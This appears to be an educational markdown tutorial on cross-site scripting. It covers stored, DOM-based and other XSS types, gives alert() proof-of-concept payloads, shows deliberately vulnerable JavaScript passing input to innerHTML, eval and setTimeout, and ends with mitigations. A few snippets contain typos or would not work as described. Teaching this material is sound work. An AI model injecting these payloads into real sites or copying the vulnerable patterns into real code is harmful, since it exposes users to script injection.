# CROSS SITE SCRIPTING(XSS)

Cross Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by users, potentially compromising user data and session integrity.

## Types of XSS: 

###  1. Stored XSS (Persistent XSS):
Malicious scripts are stored on the server (e.g., in a database) and served to users when they access the affected page. This type can affect multiple users and is often more dangerous.

###  2. Reflected XSS (Non Persistent XSS):
Malicious scripts are reflected off a web server, typically via a URL or form submission. The script is executed immediately when the user clicks a link or submits a form, affecting only that user.

### 3. DOM based XSS:
The vulnerability exists in the client side code (JavaScript) rather than the server. The malicious script is executed as a result of modifying the DOM (Document Object Model) in the browser, often through unsafe JavaScript functions.

`Sources:`
A source is where untrusted or user-controlled data enters the application.

| Source Type         | Example                           | Description                   |
| ------------------- | --------------------------------- | ----------------------------- |
| `location`          | `window.location.search`          | Query string from the URL     |
| `document.referrer` | `document.referrer`               | Referring URL                 |
| `document.cookie`   | `document.cookie`                 | Cookies                       |
| `localStorage`      | `localStorage.getItem('x')`       | Browser-stored key/value data |
| `user input`        | `<input>` field, form submissions | Direct user data input        |

`Sink:`
A sink is a function or property where data is used in a way that can be dangerous if the data is not sanitized.
| Sink Function    | Example                    | Risk                        |
| ---------------- | -------------------------- | --------------------------- |
| `innerHTML`      | `element.innerHTML = data` | Executes HTML/JS → XSS risk |
| `document.write` | `document.write(data)`     | Renders arbitrary data      |
| `eval()`         | `eval(data)`               | Executes JS code            |
| `setTimeout()`   | `setTimeout(data, 1000)`   | Interprets string as code   |
| `location.href`  | `window.location = data`   | Redirects to attacker site  |


### 4. DOM Clobbering:
DOM Clobbering is a web vulnerability where an attacker injects specially crafted HTML elements that overwrite default JavaScript object properties or DOM references in the browser, changing the behavior of scripts on the page.

###  4. Self XSS:
A less common variant where users are tricked into executing scripts in their own browsers, often through social engineering.

### 5. Blind XSS:
A type of stored XSS where the attacker does not see the immediate effect of the attack, as the payload is executed in an admin panel or another context.





## Methods to perform Stored XSS
### - Using HTML Injection:

Attackers can inject HTML tags along with JavaScript to manipulate the DOM or create misleading content.
```text
<script>alert('Stored XSS Attack!');</script>
```
When a user visits the page that displays the stored content, the script executes.

### - Exploiting Event Handlers:
Attackers can use event handlers (like onload, onclick, etc.) to execute scripts when certain events occur.
```text
<img src="invalid.jpg" onerror="alert('XSS via Event Handler!');">
```
This script executes when the image fails to load.

### - Using JavaScript URL:
Attackers can inject JavaScript URLs that execute when the user interacts with the link.
```text
<a href="javascript:alert('XSS via JavaScript URL!')">Click me</a>
```
When the user clicks the link, the alert executes.

### - Base64 Encoding:
Attackers can encode their payload in Base64 to bypass certain filters that may block direct script tags.
```text
<script src="data:text/javascript;base64,YWxlcnQoJ1hTUyBhdHRhY2snKTs="></script>
```
This Base64 encoded script will execute when the page is loaded.

### - Using Malicious Payloads in Form Fields:
Attackers can inject scripts into form fields that are later displayed on the page.
```text
<input type="text" value="<script>alert('XSS in Form Field!');</script>">
```
When the form is submitted and the input is displayed, the script executes.

### - Exploiting JSON Responses:
If the application returns JSON data that is not properly sanitized, attackers can inject scripts into the JSON response.
```text
{
    "message": "<script>alert('XSS in JSON!');</script>"
}
```
If this JSON is rendered directly into the HTML without sanitization, the script will execute.

### - Using Third Party Libraries:
Attackers can exploit vulnerabilities in third party libraries that do not properly handle user input.
If a web application uses a library that allows HTML rendering without sanitization, an attacker can inject:
```text
<div><script>alert('XSS via Library!');</script></div>
```

## MEthods to perform Dom-Based XSS:

### - Manipulating URL Parameters:
Attackers can inject malicious scripts through URL parameters that are directly used in the DOM without proper sanitization.
`Example:`
```text
// Vulnerable JavaScript code
const userInput = location.hash.substring(1); // Gets the hash from the URL
document.getElementById('output').innerHTML = userInput; // Directly injects into the DOM
```
`Payload:`
```text
http://example.com/#<script>alert('DOM XSS!');</script>
```
When the user visits this URL, the script executes.

### - Using eval():
If the application uses eval() to execute JavaScript code from user input, it can lead to severe vulnerabilities.
`Example:`
```text
// Vulnerable JavaScript code
const userInput = getUser Input(); // Assume this gets input from the user
eval(userInput); // Executes user input as code
```
`Payload:`
```text
alert('DOM XSS via eval!');
```
If an attacker can control getUser Input(), they can execute arbitrary code.

### - Exploiting document.write():
Using document.write() with untrusted data can lead to XSS if the data is not sanitized.
`Example:`
```text
// Vulnerable JavaScript code
const userInput = getUser Input(); // Assume this gets input from the user
document.write(userInput); // Writes user input directly to the document
```
`Payload:`
```text
<script>alert('DOM XSS via document.write!');</script>
```
If the attacker can control getUser Input(), they can inject scripts.

### - Using Event Handlers:
Attackers can inject malicious payloads into event handlers that execute when a user interacts with the page.
`Example:`
```text
<div id="container"></div>
<script>
    const userInput = getUser Input(); // Assume this gets input from the user
    document.getElementById('container').innerHTML = `<button onclick="${userInput}">Click me</button>`;
</script
```
`Payload:`
```text
alert('DOM XSS via Event Handler!');
```
When the button is clicked, the injected script executes.

### - Using setTimeout() or setInterval():
If user input is passed to setTimeout() or setInterval(), it can lead to XSS.
`Example:`
```text
const userInput = getUser Input(); // Assume this gets input from the user
setTimeout(userInput, 1000); // Executes user input after 1 second
```
`Payload:`
```text
alert('DOM XSS via setTimeout!');
```

### - Exploiting JSON Data:
If the application uses JSON data that includes user input without proper sanitization, it can lead to XSS.
`Example:`
```text
const jsonData = '{"message": "<script>alert(\'DOM XSS via JSON!\');</script>"}';
const data = JSON.parse(jsonData);
document.getElementById('output').innerHTML = data.message; // Directly injects into the DOM
```
If the JSON data is controlled by an attacker, the script executes.

## Mitigation of XSS:
- ### Input Validation :
  Validate and sanitize all user inputs to ensure they do not contain malicious scripts.

- ### Output Encoding:
  Encode data before rendering it in the browser to prevent execution of injected scripts.

- ### Avoid Dangerous Functions:
  Refrain from using functions like " eval() ", " document.write() ", and direct DOM manipulation with untrusted data.

- ### Use Safe APIs:
  Utilize safer alternatives for manipulating the DOM, such as " textContent " or " setAttribute() " instead of "innerHTML".

- ### Content Security Policy (CSP):
  Implement a strong CSP to restrict the sources from which scripts can be executed.

- ### Use Frameworks with Built-in XSS Protection:
  Many modern web frameworks and libraries provide built-in mechanisms to prevent XSS like " react " etc.

- ### Escape Output:
  Use " htmlspecialchars() " in PHP or " encodeURIComponent() " in JavaScript.
